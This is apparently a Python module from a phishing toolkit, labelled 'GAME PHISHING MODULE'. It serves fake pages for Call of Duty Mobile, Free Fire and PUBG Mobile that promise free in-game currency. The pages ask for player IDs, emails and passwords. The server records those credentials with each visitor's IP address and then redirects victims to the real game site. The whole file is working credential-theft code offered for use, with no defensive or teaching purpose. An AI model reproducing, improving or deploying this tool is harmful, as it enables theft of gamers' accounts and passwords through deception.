#!/usr/bin/env python3
import sys, os, http.server, socketserver
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "core"))
from auth import auth_required
from utils import log_action

CAPTURED = []

class GameHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        game = self.path.strip("/").split("/")[0] if "/" in self.path else "codm"
        self.wfile.write(self.get_page(game).encode())
    def do_POST(self):
        cl = int(self.headers.get("Content-Length", 0))
        data = self.rfile.read(cl).decode() if cl else ""
        creds = {}
        for pair in data.split("&"):
            if "=" in pair:
                k, v = pair.split("=", 1)
                creds[k] = v
        CAPTURED.append({"ip": self.client_address[0], "data": creds})
        print("\n[GAME] CAPTURED from " + self.client_address[0] + ": " + str(creds))
        self.send_response(302)
        self.send_header("Location", "https://www.callofduty.com/mobile")
        self.end_headers()
    def get_page(self, game):
        if game == "freefire":
            return """<!DOCTYPE html><html><head><title>Free Fire - Diamonds</title></head>
<body style="font-family:Arial;background:#1a0a2e;color:#fff;text-align:center;padding:20px">
<div style="max-width:400px;margin:0 auto;background:#2d1b4e;padding:30px;border-radius:10px">
<h2 style="color:#ffcc00">GARENA FREE FIRE</h2><h3>Free 50,000 Diamonds</h3>
<form method="POST"><input type="text" name="player_id" placeholder="Player ID" style="width:100%;padding:12px;margin:10px 0" required><br>
<input type="email" name="email" placeholder="Email" style="width:100%;padding:12px;margin:10px 0" required><br>
<input type="password" name="password" placeholder="Password" style="width:100%;padding:12px;margin:10px 0" required><br>
<button type="submit" style="width:100%;padding:15px;background:#ffcc00;border:none;color:#1a0a2e;font-weight:bold">GET DIAMONDS</button></form></div></body></html>"""
        elif game == "pubg":
            return """<!DOCTYPE html><html><head><title>PUBG - UC</title></head>
<body style="font-family:Arial;background:#1a1a2e;color:#fff;text-align:center;padding:20px">
<div style="max-width:400px;margin:0 auto;background:#16213e;padding:30px;border-radius:10px">
<h2 style="color:#e94560">PUBG MOBILE</h2><h3>Free 81,00 UC</h3>
<form method="POST"><input type="text" name="character_id" placeholder="Character ID" style="width:100%;padding:12px;margin:10px 0" required><br>
<input type="email" name="email" placeholder="Email" style="width:100%;padding:12px;margin:10px 0" required><br>
<input type="password" name="password" placeholder="Password" style="width:100%;padding:12px;margin:10px 0" required><br>
<button type="submit" style="width:100%;padding:15px;background:#e94560;border:none;color:#fff;font-weight:bold">CLAIM UC</button></form></div></body></html>"""
        else:
            return """<!DOCTYPE html><html><head><title>CODM - CP</title></head>
<body style="font-family:Arial;background:#0a0a0a;color:#fff;text-align:center;padding:20px">
<div style="max-width:400px;margin:0 auto;background:#1a1a1a;padding:30px;border-radius:10px">
<h2 style="color:#ff6600">CALL OF DUTY: MOBILE</h2><h3>Free 10,000 CP</h3>
<form method="POST"><input type="text" name="uid" placeholder="UID" style="width:100%;padding:12px;margin:10px 0" required><br>
<input type="email" name="email" placeholder="Email" style="width:100%;padding:12px;margin:10px 0" required><br>
<input type="password" name="password" placeholder="Password" style="width:100%;padding:12px;margin:10px 0" required><br>
<button type="submit" style="width:100%;padding:15px;background:#ff6600;border:none;color:#fff;font-weight:bold">CLAIM NOW</button></form></div></body></html>"""
    def log_message(self, format, *args):
        pass

@auth_required
def run_game_phish():
    print("""
    ╔═══════════════════════════════════════════════════════╗
    ║           GAME PHISHING MODULE                        ║
    ╚═══════════════════════════════════════════════════════╝
    """)
    print("[1] CODM")
    print("[2] Free Fire")
    print("[3] PUBG Mobile")
    choice = input("\n[GAME] Select: ").strip()
    games = {"1": "codm", "2": "freefire", "3": "pubg"}
    game = games.get(choice, "codm")
    port = int(input("[GAME] Port (default 8080): ").strip() or "8080")
    print("[GAME] Starting " + game.upper() + " on port " + str(port) + "...")
    print("[GAME] Share: http://YOUR_IP:" + str(port) + "/" + game)
    try:
        with socketserver.TCPServer(("", port), GameHandler) as httpd:
            httpd.serve_forever()
    except KeyboardInterrupt:
        print("\n[GAME] Stopped.")
        if os.path.exists("game_captured.txt"):
            print("[GAME] Check game_captured.txt")
    log_action("GAME", game + " on port " + str(port))
